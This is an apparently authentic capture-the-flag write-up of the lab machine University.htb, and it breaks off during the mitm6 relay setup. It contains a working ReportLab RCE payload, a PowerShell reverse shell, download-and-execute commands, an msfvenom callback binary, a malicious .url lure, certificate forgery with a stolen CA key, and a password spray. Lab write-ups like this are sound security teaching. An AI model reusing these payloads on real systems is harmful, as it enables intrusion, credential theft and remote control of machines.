# 🏆 Complete Detailed Write-Up: University.htb

**Date:** 28 July 2026 \
**Difficulty:** Insane \
**OS:** Windows Server 2019/2022 \
**Domain:** university.htb \
**Target IP:** 10.129.231.193 \
**Attacker Host:** hyena@hyena \
**Pentester:** RavenHex

---
<img src="POC/University.png">

## 1. Overview

University is an Insane-difficulty Windows Active Directory machine that demonstrates a sophisticated attack chain involving web application exploitation, certificate abuse, and Kerberos delegation misconfigurations. The attack path progresses from a ReportLab RCE vulnerability, through certificate theft and a phishing-style lecture upload, to an NTLM relay against Windows delegation, and finally to domain admin via a Group Managed Service Account (GMSA) that is itself misconfigured with Resource-Based Constrained Delegation (RBCD) rights over the Domain Controller.

### The Attack Chain:

1. **ReportLab RCE (CVE-2023-33733)** — The website uses xhtml2pdf to generate PDFs from HTML content. A malicious payload injected into the profile bio triggers RCE the moment a PDF export is requested.
2. **Shell as WAO** — Initial foothold on the Domain Controller as `university\wao`.
3. **Password Discovery** — `WebAO1337` is found inside `db-backup-automator.ps1` and turns out to be WAO's own AD password, reusable for SMB and WinRM.
4. **Delegation Recon** — `Get-ADComputer` reveals that `WS-3` is trusted for unconstrained delegation, marking it as a future ticket-harvesting target.
5. **Certificate Forging** — The unprotected Root CA key pair is discovered on the web server, allowing certificate forgery for `nya` (Professor), granting course-management rights.
6. **Malicious Lecture Upload** — A GPG-signed ZIP containing a `.url` file is uploaded as a course lecture, exploiting CVE-2023-36025 to get code execution as `martin.t` once the file is opened on the review workstation `WS-3`.
7. **RBCD Relay Attack** — `mitm6` poisons IPv6/WPAD name resolution and `ntlmrelayx` relays `WS-3$`'s machine authentication to LDAP, granting a fake computer account (`hyena$`) RBCD rights over `WS-3`.
8. **Administrator on WS-3** — `getST.py` abuses that RBCD trust to request a service ticket impersonating Administrator on `WS-3`.
9. **Ticket Harvesting** — Because `WS-3` is trusted for unconstrained delegation, Rubeus dumps every TGT cached in its LSASS memory, including `Rose.L`'s.
10. **GMSA Abuse** — `Rose.L`'s ticket is used to authenticate to the DC directly, where BloodHound shows `Rose.L` → Help Desk → Account Operators → `ReadGMSAPassword` on `GMSA-PClient01$`.
11. **RBCD on the GMSA** — `GMSA-PClient01$` is itself configured with `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD) over the DC's computer object, so its retrieved NTLM hash can be used to request a Kerberos service ticket impersonating Administrator directly against the DC.
12. **Root Flag** — The resulting Administrator ticket is used to get a WinRM shell and the root flag.

---

## 2. Reconnaissance

### 2.1 Full TCP Port Scan

A full TCP port scan is performed to identify all open services on the target. The scan uses SYN scanning (`-sS`), skips host discovery (`-Pn`), and scans all 65,535 ports at a high rate. Skipping host discovery matters here specifically because ICMP is very commonly filtered on hardened Windows hosts, and a ping-based liveness check would otherwise mark the box as down before a single port is even probed.

```bash
hyena@hyena$ nmap -sS -Pn -min-rate 5000 --max-retries 1 -T4 -p- 10.129.231.193
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 04:42 +0000
Warning: 10.129.231.193 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.129.231.193
Host is up (0.35s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49679/tcp open  unknown
49685/tcp open  unknown
49706/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.07 seconds
```


The port list is immediately recognizable as a Windows Active Directory Domain Controller: Kerberos (88), LDAP/Global Catalog (389/3268/3269), SMB (445), and the RPC/WinRM ports that come with every domain-joined Windows box. Port 80 is open, indicating a web server.

### 2.2 Service & Version Detection

Once the open ports are known, a targeted scan against just those ports can afford to run more expensive checks — version detection, default NSE scripts, and OS fingerprinting — without paying the cost of running them against all 65,535 ports.

```bash
hyena@hyena$ nmap -sV -sC -p 53,80,88,135,139,389,445,464,593,636,2179,3268,3269,5985,9389,47001 -O -A 10.129.231.193
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 04:45 +0000
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 04:45 (0:00:03 remaining)
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 04:45 (0:00:03 remaining)
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 04:45 (0:00:03 remaining)
Nmap scan report for university.htb (10.129.231.193)
Host is up (0.35s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.24.0
|_http-title: University
|_http-server-header: nginx/1.24.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-28 11:51:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|11|2012|2022|2016 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows 10 1709 - 22H2 (94%), Microsoft Windows 10 1909 (92%), Microsoft Windows 11 24H2 - 25H2 (92%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows Server 2016 (90%), Microsoft Windows 10 21H2 (90%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: 7h05m50s
| smb2-time:
|   date: 2026-07-28T11:52:09
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   426.70 ms 10.10.14.1
2   426.95 ms university.htb (10.129.231.193)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.84 seconds
```

<img src="POC/Defalut_page.png">

**Key Findings:**
- Domain: `university.htb`
- DC Hostname: `DC.university.htb`
- OS: Windows Server 2019/2022
- Web server: nginx 1.24.0 (Django application)
- SMB signing is enabled and required (no relay attacks against SMB itself — the relay used later in this box targets LDAP instead)
- Time skew: +7 hours (will need `ntpdate` for Kerberos)

The clock-skew warning matters practically: Kerberos authentication requires the client and DC clocks to agree within a small tolerance (5 minutes by default), so any Kerberos-based tooling used later needs to account for this ~7-hour offset (e.g. with `ntpdate`) or authentication will fail with a clock-skew error even when the credentials are correct.

### 2.3 DNS Resolution

The domain and hostname are added to `/etc/hosts` to ensure proper name resolution for all subsequent tools, since Kerberos and LDAP tooling generally expect to resolve the DC by name, not just by IP. `netexec` can generate this line automatically from the SMB banner it collects, which is a convenient shortcut over typing it by hand:

```bash
hyena@hyena$ netexec smb 10.129.231.193 --generate-hosts hosts
SMB         10.129.231.193  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:university.htb) (signing:True) (SMBv1:False)
hyena@hyena$ cat hosts
10.129.231.193  DC.university.htb university.htb DC
hyena@hyena$ cat hosts /etc/hosts | sponge /etc/hosts
```

### 2.4 Web Application Enumeration

The website is a Django application for a university, offering both student and professor self-registration, a course dashboard, and a certificate-based login option in addition to the normal username/password form:

```bash
hyena@hyena$ curl -I http://university.htb/
HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: Tue, 28 Jul 2026 12:00:47 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
```



**Key Observations:**
- Django web application (confirmed by the default Django 404 page and by Wappalyzer)
- Student and Professor registration available; the professor role requires the account to be activated before it can log in normally
- Certificate-based login ("Request Signed-Cert") lets an authenticated user submit a CSR and receive a certificate signed by the site's own CA — this same CA material is what gets abused later to forge a professor login
- Once logged in as a student, courses can be browsed and enrolled in; each course exposes a lecture archive containing PDFs, slide decks, and reference `.url` files for review
- Profile export generates a PDF using xhtml2pdf, and there is a "Content Evaluation" team mentioned on the site that is responsible for reviewing uploaded lecture material — a strong hint that whatever gets uploaded as a lecture will eventually be opened by a real person on a real workstation

### 2.5 PDF Metadata Analysis

The PDF export reveals the underlying technology:

```bash
hyena@hyena$ exiftool profile.pdf
ExifTool Version Number         : 13.55
File Name                       : profile.pdf
Directory                       : .
File Size                       : 7.6 kB
File Modification Date/Time     : 2026:07:28 05:01:12+00:00
File Access Date/Time           : 2026:07:28 05:01:26+00:00
File Inode Change Date/Time     : 2026:07:28 05:01:26+00:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Author                          :
Create Date                     : 2026:07:28 05:07:00+08:00
Creator                         : (unspecified)
Modify Date                     : 2026:07:28 05:07:00+08:00
Producer                        : xhtml2pdf <https://github.com/xhtml2pdf/xhtml2pdf/>
Subject                         :
Title                           : University | raven Profile
Trapped                         : False
Page Mode                       : UseNone
Page Count                      : 1
```

**Critical Finding:** The PDF is generated using `xhtml2pdf`, which uses ReportLab under the hood for the actual rendering. This is vulnerable to CVE-2023-33733 (ReportLab RCE) — the same bug family seen on other ReportLab-based boxes, since the underlying rendering engine, not the wrapper library, is what's flawed.

---

## 3. Initial Foothold: ReportLab RCE (CVE-2023-33733)

### 3.1 Understanding the Vulnerability

ReportLab has a critical vulnerability where the `color` attribute in `<font>` tags is evaluated by Python's `eval()` instead of being treated as plain text. The public proof-of-concept payload abuses Python's attribute lookup and comparison operator overloading to smuggle a call to `os.system()` past ReportLab's simple keyword blocklist, without ever writing the literal string `os.system` where the filter can see it.

The exploit payload template:

```html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('COMMAND_HERE') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
    exploit
</font></para>
```

### 3.2 Testing with Ping

A ping test is performed to confirm command execution before committing to a full reverse shell payload — cheap to send, and a burst of four ICMP replies (the Windows default `ping` count) is an unambiguous signal versus, say, a Linux host that would ping indefinitely:

```html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('ping -n 5 10.10.14.5') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
    exploit
</font></para>
```

<img src="POC/User_bio_area.png">

The payload is pasted into the bio field of the user profile.

<img src="POC/Submiting_paylad_inBio_section.png">

Upon exporting the profile to PDF, ICMP packets confirm command execution:

```bash
hyena@hyena$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
20:24:48.066620 IP 10.129.231.193 > 10.10.14.5: ICMP echo request, id 1, seq 1, length 40
20:24:48.066666 IP 10.10.14.5 > 10.129.231.193: ICMP echo reply, id 1, seq 1, length 40
20:24:49.076732 IP 10.129.231.193 > 10.10.14.5: ICMP echo request, id 1, seq 2, length 40
20:24:49.076766 IP 10.10.14.5 > 10.129.231.193: ICMP echo reply, id 1, seq 2, length 40
20:24:50.097978 IP 10.129.231.193 > 10.10.14.5: ICMP echo request, id 1, seq 3, length 40
20:24:50.097995 IP 10.10.14.5 > 10.129.231.193: ICMP echo reply, id 1, seq 3, length 40
20:24:51.117805 IP 10.129.231.193 > 10.10.14.5: ICMP echo request, id 1, seq 4, length 40
20:24:51.117824 IP 10.10.14.5 > 10.129.231.193: ICMP echo reply, id 1, seq 4, length 40
```

Getting exactly four replies back-to-back, then silence, is consistent with the Windows default of sending four echo requests — a useful early signal that the target executing the payload is Windows, before ever landing a shell.

### 3.3 Getting a Reverse Shell

A PowerShell reverse shell is created and hosted:

```bash
hyena@hyena$ cat > shell.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
EOF
```

Getting the payload onto disk is done in two stages rather than one long inline command, since the ReportLab payload has to survive being embedded inside an HTML/CSS color attribute — first fetch the script, then execute it as a separate call:

```html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -c iwr http://10.10.14.5:8080/shell.ps1 -o shell.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
    exploit
</font></para>
```

```html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./shell.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
    exploit
</font></para>
```

<img src="POC/Got_initial_university_shell.png">

A reverse shell is received:

```bash
hyena@hyena$ rlwrap -cAr nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.231.193 53894
Windows PowerShell running as user WAO on DC
PS C:\Web\University> whoami
university\wao
```

---

## 4. Shell as WAO on DC

### 4.1 Initial Enumeration

```powershell
PS C:\Web\University> whoami
university\wao
PS C:\Web\University> hostname
DC
PS C:\Web\University> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:
   IPv4 Address. . . . . . . . . . . : 10.129.231.193
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.129.231.1

Ethernet adapter vEthernet (Internal-VSwitch1):

   IPv4 Address. . . . . . . . . . . : 192.168.99.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
```

The second NIC is the giveaway that this "Domain Controller" is actually hosting a private, internal 192.168.99.0/24 network behind it — the DC is dual-homed, bridging the externally reachable HTB network and an internal lab network where the other domain-joined machines live.

### 4.2 Discovering the Backup Script

In `C:\Web\DB Backups`, a PowerShell script is found:

```powershell
PS C:\Web\DB Backups> cat db-backup-automator.ps1
$sourcePath = "C:\Web\University\db.sqlite3"
$destinationPath = "C:\Web\DB Backups\"
$7zExePath = "C:\Program Files\7-Zip\7z.exe"

$zipFileName = "DB-Backup-$(Get-Date -Format 'yyyy-MM-dd').zip"
$zipFilePath = Join-Path -Path $destinationPath -ChildPath $zipFileName
$7zCommand = "& `"$7zExePath`" a `"$zipFilePath`" `"$sourcePath`" -p'WebAO1337'"
Invoke-Expression -Command $7zCommand
```

**Critical Finding:** The backup archive password is `WebAO1337`. This is not just an archive password — it turns out to be WAO's own AD account password, likely because whoever wrote the automation script reused a personal password as a quick placeholder and never rotated it.

### 4.3 Password Spray

The password `WebAO1337` is sprayed across the full list of domain users pulled from `net user`, both to confirm the reuse theory and to check whether any other account shares it:

```bash
hyena@hyena$ netexec smb dc.university.htb -u users.txt -p WebAO1337 --continue-on-success
SMB         10.129.231.193   445    DC               [+] university.htb\WAO:WebAO1337
```

It only comes back positive for `WAO`, the same user already compromised — but that's still valuable, because it confirms the password is a real, currently-set AD credential rather than a coincidence, and it also works for WinRM:

```bash
hyena@hyena$ netexec winrm dc.university.htb -u WAO -p WebAO1337
WINRM       10.129.231.193   5985   DC               [+] university.htb\WAO:WebAO1337 (Pwn3d!)
```

That means from here on, a much more stable interactive session can be used instead of the raw reverse shell:

```bash
hyena@hyena$ evil-winrm -i dc.university.htb -u WAO -p 'WebAO1337'
```

### 4.4 Domain Enumeration

```powershell
PS C:\Web\University> Import-Module ActiveDirectory; Get-ADComputer -Filter * -Property DNSHostName | Select-Object Name,DNSHostName,IPAddress

Name         DNSHostName                 IPAddress
----         -----------                 ---------
DC           DC.university.htb           {}
WS-3         WS-3.university.htb         {}
WS-1                                     {}
WS-2                                     {}
WS-4                                     {}
WS-5                                     {}
LAB-2        LAB-2                       {}
SETUPMACHINE SetupMachine.university.htb {}
```

DNS resolution reveals IPs:

```powershell
PS C:\Web\University> Get-ADComputer -Filter * -Property DNSHostName | ForEach-Object {
    $computer = $_
    try {
        $ip = [System.Net.Dns]::GetHostAddresses($computer.DNSHostName) | Where-Object {$_.AddressFamily -eq 'InterNetwork'} | Select-Object -First 1
        [PSCustomObject]@{
            Name = $computer.Name
            DNSHostName = $computer.DNSHostName
            IPAddress = $ip.IPAddressToString
        }
    } catch {
        [PSCustomObject]@{
            Name = $computer.Name
            DNSHostName = $computer.DNSHostName
            IPAddress = "N/A"
        }
    }
}

Name         DNSHostName                 IPAddress
----         -----------                 ---------
DC           DC.university.htb           10.129.231.193
WS-3         WS-3.university.htb         192.168.99.2
WS-1                                     10.129.231.193
WS-2                                     10.129.231.193
WS-4                                     10.129.231.193
WS-5                                     10.129.231.193
LAB-2        LAB-2                       192.168.99.12
SETUPMACHINE SetupMachine.university.htb 10.10.10.4
```

`WS-3` and `LAB-2` both resolve to the internal 192.168.99.0/24 range identified earlier and are the two machines worth pivoting to. `LAB-2`'s name and the fact that it doesn't resolve to a Windows-style DNS entry hints it may not even be a Windows box.

**Delegation check:** Before moving on, it's worth specifically asking AD whether any of these computer accounts are trusted for delegation, since that has a direct, exploitable impact later if a foothold can be gained on them:

```powershell
PS C:\Web\University> Get-ADComputer -Identity WS-3 -Properties TrustedForDelegation,servicePrincipalName

DistinguishedName    : CN=WS-3,CN=Computers,DC=university,DC=htb
DNSHostName          : WS-3.university.htb
Enabled              : True
Name                 : WS-3
ObjectClass          : computer
SamAccountName       : WS-3$
servicePrincipalName : {TERMSRV/WS-3, TERMSRV/WS-3.university.htb, WSMAN/WS-3, WSMAN/WS-3.university.htb...}
TrustedForDelegation : True
```

**Critical Finding:** `WS-3` is configured for **unconstrained delegation**. Any account that authenticates to `WS-3` will have a copy of its TGT cached in that machine's LSASS memory — meaning that gaining Administrator (or SYSTEM) on `WS-3` later effectively hands over the Kerberos tickets of everyone who has recently logged into it.

### 4.5 SMB Enumeration

```bash
hyena@hyena$ netexec smb dc.university.htb -u WAO -p WebAO1337 --shares
SMB         10.129.231.193   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:university.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.193   445    DC               [+] university.htb\WAO:WebAO1337
SMB         10.129.231.193   445    DC               [*] Enumerated shares
SMB         10.129.231.193   445    DC               Share           Permissions     Remark
SMB         10.129.231.193   445    DC               -----           -----------     ------
SMB         10.129.231.193   445    DC               ADMIN$                          Remote Admin
SMB         10.129.231.193   445    DC               C$                              Default share
SMB         10.129.231.193   445    DC               IPC$            READ            Remote IPC
SMB         10.129.231.193   445    DC               Lectures                        Lectures Share folder for Content Evalutors for reviewing submitted lectures
SMB         10.129.231.193   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.231.193   445    DC               SYSVOL          READ            Logon server share
```

The `Lectures` share name lines up with the "Content Evaluation" team hinted at on the website — WAO can't read it directly, but it confirms that whatever gets uploaded as course material really is picked up and opened by a reviewer somewhere on the internal network.

### 4.6 Root CA Files

The CA directory contains the Root CA files that the Django app uses to sign certificate-login requests:

```powershell
PS C:\Web\University> ls CA

Directory: C:\Web\University\CA

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/15/2024   5:51 AM           1399 rootCA.crt
-a----        2/15/2024   5:48 AM           1704 rootCA.key
-a----        2/25/2024   5:41 PM             42 rootCA.srl
```

Both the certificate and its private key are sitting unencrypted and world-readable to anyone with a shell as WAO. These files are downloaded to the attacker machine — with this key pair in hand, any certificate for any identity can be minted and self-signed, entirely bypassing the site's own trust model.

---

## 5. Lateral Movement: Pivoting with Chisel

### 5.1 Setting Up Chisel

Since the internal network (192.168.99.x) is not directly accessible from outside, and the DC itself has no useful proxy tooling pre-installed, Chisel is used to create a SOCKS tunnel through the WAO shell.

```bash
# On the attacker host
hyena@hyena$ ./chisel server -p 8000 --reverse --socks5
```

```powershell
# On DC (Evil-WinRM)
PS C:\Users\WAO\Downloads> .\chisel.exe client 10.10.14.5:8000 R:socks
```

### 5.2 Evil-WinRM as WAO

```bash
hyena@hyena$ evil-winrm -i 10.129.231.193 -u wao -p 'WebAO1337'
```

### 5.3 Connecting to WS-3

`WS-3` only exposes SMB and WinRM internally (a quick internal port scan through the tunnel confirms only 139/445/5985 respond), and WAO's credentials work there too:

```bash
hyena@hyena$ proxychains4 evil-winrm -i 192.168.99.2 -u wao -p 'WebAO1337'
*Evil-WinRM* PS C:\Users\wao\Documents> whoami
university\wao
```

Notably, `WS-3` has no route back out to the attacker's HTB IP at all — direct callbacks from this host will simply fail, which matters a lot when staging a payload later; anything that needs to shell back has to call the other internal pivot host, `LAB-2`, instead.

### 5.4 Connecting to LAB-2

```bash
hyena@hyena$ proxychains4 ssh wao@192.168.99.12
wao@LAB-2:~$ whoami
wao
```

`LAB-2` turns out to be an Ubuntu box explicitly labeled (in its SSH banner) as a web-developer testing lab, and `wao` there has unrestricted `sudo` rights:

```bash
wao@LAB-2:~$ sudo -l
User wao may run the following commands on LAB-2:
    (ALL : ALL) ALL
wao@LAB-2:~$ sudo -i
root@LAB-2:~# whoami
root
```

Root on `LAB-2` matters for two reasons used later: it's the only internal host with tools like `impacket`'s scripts and `mitm6` readily usable, and — because it's on the same internal segment as `WS-3` — it's a perfect place to catch a callback that `WS-3` itself can't send directly to the attacker's VPN IP.

---

## 6. Professor Access via Certificate Forging

### 6.1 Identifying Professor Accounts

The database reveals professor accounts:

```sql
sqlite> select username,email,user_type from University_customuser where user_type='Professor';
username|email|user_type
george|george@university.htb|Professor
carol|carol@science.com|Professor
Nour|nour.qasso@gmail.com|Professor
martin.rose|martin.rose@hotmail.com|Professor
nya|nya.laracrof@skype.com|Professor
```

### 6.2 Forging Nya's Certificate

Using the Root CA files pulled from the web server, a CSR is generated for a brand-new keypair using `nya`'s name and email, and then self-signed with the stolen CA key — no password or access to `nya`'s real account is ever needed:

```bash
hyena@hyena$ openssl req -newkey rsa:2048 -keyout nya.key -out nya.csr -nodes -subj "/CN=nya/emailAddress=nya.laracrof@skype.com"
hyena@hyena$ openssl x509 -req -in nya.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -out nya.crt -days 365
hyena@hyena$ openssl pkcs12 -export -out nya.pfx -inkey nya.key -in nya.crt -password pass:nya123
```

Uploading this forged certificate at the site's certificate-login page authenticates directly as `nya` — the application trusts anything signed by its own CA and never checks whether the certificate corresponds to a request it actually issued.

<img src="POC/Succesfullt_login_as_naya.png">

Login as Nya provides professor access, including the ability to create and manage courses and lectures:

<img src="POC/naya_professor_detail.png">

### 6.3 Uploading Nya's GPG Public Key

The lecture upload workflow requires every archive to be detached-signed with GPG, and the site needs the professor's public key on file to verify that signature. A key is generated locally under Nya's identity, purely so a signature can be produced and trusted by the site — it doesn't need to match any key Nya may have used in real life:

```bash
hyena@hyena$ gpg --batch --gen-key <<EOF
%no-protection
Key-Type: RSA
Key-Length: 2048
Name-Real: Nya Laracrof
Name-Email: nya.laracrof@skype.com
%commit
EOF
hyena@hyena$ gpg --armor --export nya.laracrof@skype.com > nya-pubkey.asc
```

The public key is uploaded to Nya's profile, after which the site will accept lecture archives signed with the matching private key.

### 6.4 Creating a Malicious Lecture

Reference `.url` files bundled with real lectures are just plain-text Windows internet shortcuts. A malicious one is crafted that, instead of pointing at a web page, points at a local executable path that will be dropped on the reviewer's machine ahead of time:

```bash
hyena@hyena$ cat > click_me.url << 'EOF'
[InternetShortcut]
URL=file://C:/Programdata/amra.exe
IDList=
EOF

hyena@hyena$ cat > Reference-1.url << 'EOF'
[InternetShortcut]
URL=http://site1.reference.com
IDList=
EOF

hyena@hyena$ cat > Reference-2.url << 'EOF'
[InternetShortcut]
URL=http://site2.reference.com/reference
IDList=
EOF

hyena@hyena$ zip lecture0xdf.zip Reference-1.url Reference-2.url click_me.url
hyena@hyena$ gpg -u nya.laracrof@skype.com --detach-sign lecture0xdf.zip
```

One easy-to-miss requirement: the archive's contents must sit at the root of the zip with no internal folder, or the site's automated review pipeline silently fails to process it — a subtlety that isn't obvious just from looking at the sample lecture template the site provides.

<img src="POC/Upload_form.png">

The lecture, along with its `.sig` file and updated public key, is uploaded as Nya.

---

## 7. Shell as Martin.T on WS-3

### 7.1 Preparing the Payload

Since `WS-3` cannot reach the attacker's VPN IP directly (confirmed during the pivot in Section 5), the reverse shell executable is built to call back to `LAB-2`'s internal IP instead, where a listener is waiting:

```bash
hyena@hyena$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.99.12 LPORT=9001 -f exe -o amra.exe
```

### 7.2 Uploading to WS-3

```powershell
*Evil-WinRM* PS C:\Programdata> upload amra.exe
*Evil-WinRM* PS C:\Programdata> icacls.exe amra.exe /grant Everyone:F
```

Granting `Everyone:F` matters because the file is going to be executed by whichever content-evaluator account ends up opening the malicious lecture, not by WAO — the reviewer's session needs execute rights on the binary sitting in `C:\Programdata`.

### 7.3 Triggering the Exploit

Once the review pipeline processes the lecture, the malicious `.url` file (CVE-2023-36025 — Windows SmartScreen bypass via `.url` files pointing at local paths) is opened automatically by the reviewer's session on `WS-3`, launching `amra.exe`:

```bash
hyena@hyena$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection from 192.168.99.2 65144 received!
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\windows\temp>whoami
university\martin.t
```

### 7.4 User Flag Captured

```powershell
PS C:\Windows\system32> type C:\Users\martin.t\Desktop\user.txt
17d50ee87af5b0e474a7290b754a83d0
```

---

## 8. Administrator on WS-3 (RBCD Attack)

### 8.1 Strategy

Recall from Section 4.4 that `WS-3` is trusted for unconstrained delegation. The plan is to force `WS-3`'s own machine account to authenticate to an attacker-controlled LDAP listener, relay that authentication to the real DC, and use it to grant a fake computer account **Resource-Based Constrained Delegation** rights over `WS-3`. From there, that fake computer can request a Kerberos ticket impersonating Administrator on `WS-3` — all without ever needing Administrator's password or hash.

The trigger for `WS-3`'s machine account to authenticate outward is Windows' own WPAD (Web Proxy Auto-Detect) behavior: whenever certain system components try to reach the internet (checking for updates, opening the activation panel, or just periodically in the background) and no proxy is configured, Windows broadcasts a request over IPv6 to find a WPAD host. `mitm6` answers before the real DNS server can, pointing `WS-3` at `LAB-2` — this requires an interactive desktop session, which is exactly why the earlier phishing step needed to land on `WS-3` in the first place, since WAO alone never gets one.

### 8.2 Setting Up mitm6

On `LAB-2`, `mitm6` is started, targeting the `university.htb` DNS domain over the internal interface:

```bash
root@LAB-2:/tmp# python3 mitm6.py -d university.htb -i eth0
Starting mitm6 using the following configuration:
Primary adapter: eth0 [00:15:5d:05:80:07]
IPv4 address: 192.168.99.12
IPv6 address: fe80::215:5dff:fe05:8007
